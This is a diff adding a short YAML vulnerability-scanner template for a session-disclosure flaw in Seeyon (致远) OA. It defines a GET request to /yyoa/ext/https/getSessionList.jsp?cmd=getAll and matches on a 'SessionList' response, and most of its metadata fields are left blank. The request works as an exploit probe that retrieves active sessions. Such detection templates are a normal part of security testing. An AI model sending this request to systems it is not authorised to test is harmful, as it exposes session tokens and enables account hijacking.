@@ -1,0 +1,19 @@
+id:
+
+info:
+  name: 致远OA getSessionList.jsp session泄露漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /yyoa/ext/https/getSessionList.jsp?cmd=getAll
+  headers:
+  data:
+response1:
+  headers:
+  body: SessionList
+  code: 200
+requests2:
+response2:
